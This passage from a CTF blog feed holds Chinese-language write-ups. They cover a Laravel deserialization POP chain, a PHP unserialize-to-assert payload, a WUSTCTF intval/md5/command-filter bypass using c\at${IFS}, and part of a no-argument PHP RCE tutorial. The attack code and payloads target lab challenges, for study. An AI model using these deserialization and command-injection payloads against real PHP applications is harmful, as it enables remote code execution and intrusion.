class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Queue</span>\<span class="title">ShouldQueue</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event-&gt;connection = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">pop</span> = <span class="title">new</span> \<span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$pop</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看web.php路由，找到hello可访问，接着在目录中找到，封装hello的函数，发现参数h3</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=id/hello?h3=pop</span><br></pre></td></tr></table></figure><p>获取flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC刷题(一)</title>
      <link href="/posts/MISC%E5%88%B7%E9%A2%98(%E4%B8%80)/"/>
      <url>/posts/MISC%E5%88%B7%E9%A2%98(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MISC刷题-一"><a href="#MISC刷题-一" class="headerlink" title="MISC刷题(一)"></a>MISC刷题(一)</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>题目给出一个txt文本和一张图片</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302241219.png" alt="image-20220702203216104"></p><p>首先看txt文本中的内容，每行固定三列，很多行，这里rgb值<br>所以直接跑脚本rgb转图片</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="number">800</span><span class="comment">#width    #x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">800</span> <span class="comment">#height    #y坐标  x * y = 行数</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))   <span class="comment">#创建图片</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>)    <span class="comment">#打开rbg值的文件</span></span><br><span class="line"><span class="comment">#通过每个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">rgb = line.split(<span class="string">&quot; &quot;</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))    <span class="comment">#将rgb转化为像素</span></span><br><span class="line"></span><br><span class="line">im.save(<span class="string">&quot;flag.png&quot;</span>)   <span class="comment">#im.save(&#x27;flag.png&#x27;)保存为jpg图片</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到一张与题目给出图片一样的图片，应该是盲水印</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bwmforpy3.py decode 1.png flag.png x.png</span><br></pre></td></tr></table></figure><p>得到图片</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302241578.png" alt="image-20220930224130470"></p><p>成功拿到flag</p><h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB刷题(一)</title>
      <link href="/posts/WEB%E5%88%B7%E9%A2%98(%E4%B8%80)/"/>
      <url>/posts/WEB%E5%88%B7%E9%A2%98(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB刷题-一"><a href="#WEB刷题-一" class="headerlink" title="WEB刷题(一)"></a>WEB刷题(一)</h1><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302242181.png" alt="image-20220930224200103"></p><p>首先Ctrl+U查看源码发现==./time.php?source==</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302242976.png" alt="image-20220701180620262"></p><p>直接访问，得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>进行代码审计，关键位置在class里销毁时执行的函数，这里当a=phpinfo()，b=system时，会执行函数查看到phpinfo界面，所以我们可以构造 获取HelloPhp类的序列化字符串，这里屏蔽了system，改用assert</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> HelloPhp);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line">输出：O:<span class="number">8</span>:<span class="string">&quot;HelloPhp&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;phpinfo()&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;assert&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最会ctrl+f搜索flag即可找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[WUSTCTF2020]朴实无华</title>
      <link href="/posts/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
      <url>/posts/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302242717.png" alt="image-20220930224240673"></p><p>直接看题目，一上来就让我hack，这个要求多少有些让我难以拒绝。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>先F12查看一下源码</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302242948.png" alt="image-20220930224246912"></p><p>由标题猜测可能有<code>robots.txt</code>协议，猜测不到也可以通过<code>dirsearch</code>扫描后台，可以扫到一个robots.txt文件，访问即可得到一个fAke_flagggg.php的提示。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302242918.png" alt="image-20220930224251883"></p><p>再次访问可以看到一个假的flag。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243380.png" alt="image-20220930224301337"></p><p>到这里我们使用bp抓包看一下。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243960.png" alt="image-20220930224307927"></p><p>再次得到提示， 继续访问</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243187.png" alt="image-20220930224314060"></p><p>见劳如见旦，原来是旦总。<br>Chrome浏览器显示乱码，用火狐浏览器打开，在<code>查看</code>中可以<code>修复文字编码</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>查看源码，需要三层绕过才能逃脱去非洲的命运…</p><h3 id="level-1-intval-绕过"><a href="#level-1-intval-绕过" class="headerlink" title="level 1-intval 绕过"></a>level 1-intval 绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键代码：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure><p><strong>分析：</strong>通过GET传入变量<code>$num</code>的值，经过<code>intval()</code>方法处理后比<code>2020</code>小，但<code>+1</code>后比<code>2021</code>大，即可绕过。<br><strong><code>intval()</code>绕过</strong>，这个函数是强制转换为int类型。经测试以下只适合php7.0及以下版本，7.2.23版本测试不可以（就算是字符串也会直接解析科学记数法）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;2e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：a=2</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;2e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$a</span>+<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：a=20001</span></span><br></pre></td></tr></table></figure><p>进行加1 时会先将<code>$a</code>的科学计数法解析然后再加 1 ，<br>也就是说我们传入<code>2e4</code>第一次<code>intval()</code>结果为2 ，但是<code>+1</code>后会结果为<code>20001</code>，<br>所以我们传参<code>?num=2e4</code>即可完成绕过。<br><strong>注</strong>：在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243072.png" alt="image-20220930224325996"></p><p>革命尚未成功，暂时还没能逃脱去非洲的命运，接着来到旦总的第二个考验。</p><h3 id="level-2-md5-弱比较"><a href="#level-2-md5-弱比较" class="headerlink" title="level 2-md5 弱比较"></a>level 2-md5 弱比较</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET传入变量<code>$md5</code>的值，通过弱类型比较与md5加密后的值相等，即可绕过。<br>也就是以<code>0e</code>开头的字符串，md5加密后还是以<code>0e</code>开头即可在弱类型比较时均转换成整数<code>0</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5值：0e291242476940776845150308577824</span><br></pre></td></tr></table></figure><p>字符串<code>0e215962017</code>符合该条件，尝试传入参数：<code>?md5=0e215962017</code></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243782.png" alt="image-20220930224335734"></p><p>成功绕过第二关。</p><h3 id="level-3-绕过空格和cat"><a href="#level-3-绕过空格和cat" class="headerlink" title="level 3-绕过空格和cat"></a>level 3-绕过空格和cat</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在空格则会输出<code>“快到非洲了”</code>，而存在<code>cat</code>则会替换成<code>wctf2020</code>从而无法实现cat本身的作用，所以我们需要同时绕过<code>空格和cat</code>。</p><p><strong>常用的：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代替cat: tac、c\at、more、less、head、tail、sort</span><br><span class="line">代替空格：$IFS、$&#123;IFS&#125;、$IFS$1</span><br></pre></td></tr></table></figure><p>我们首先查看一下目录</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243636.png" alt="image-20220930224345581"></p><p>这个最长的应该就是flag了，我们尝试传参<code>?get_flag=c\at$&#123;IFS&#125;文件名</code></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302243011.png" alt="image-20220930224353966"></p><p>成功拿到flag，终于摆脱了被送去非洲的命运。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>写到这里，我充实而欣慰，web狗的生活往往就是这么朴实无华，且枯燥……</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数RCE总结</title>
      <link href="/posts/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E6%80%BB%E7%BB%93/"/>
      <url>/posts/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><h2 id="一、什么是无参数RCE？"><a href="#一、什么是无参数RCE？" class="headerlink" title="一、什么是无参数RCE？"></a>一、什么是无参数RCE？</h2><p>顾名思义，就是只使用函数，且函数不能带有参数，这里有很多限制：比如我们选择的函数必须能接受其括号内函数的返回值；所使用函数的参数必须为空或者为参数</p><p>比如：<strong>a(b(c()));可以使用，但是a(‘b’)或者a(‘b’,’c’)这种含有参数的都不能使用</strong></p><p>有些题目我们必须使用无参数的函数才能进行命令执行、任意文件读取、查看当前目录文件名等操作</p><h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a><strong>关键代码</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure><p>这里使用<code>preg_replace</code>替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 <code>[^A-Za-z0-9_]</code>，然后<code>(?R)?</code>这个意思为递归整个匹配模式，所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有<code>;</code></p><p>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p><h2 id="二、常见函数"><a href="#二、常见函数" class="headerlink" title="二、常见函数"></a>二、常见函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br></pre></td></tr></table></figure><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=print_r(getallheaders()); </span><br></pre></td></tr></table></figure><p>数组会返回 HTTP 请求头。</p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(get_defined_vars()); 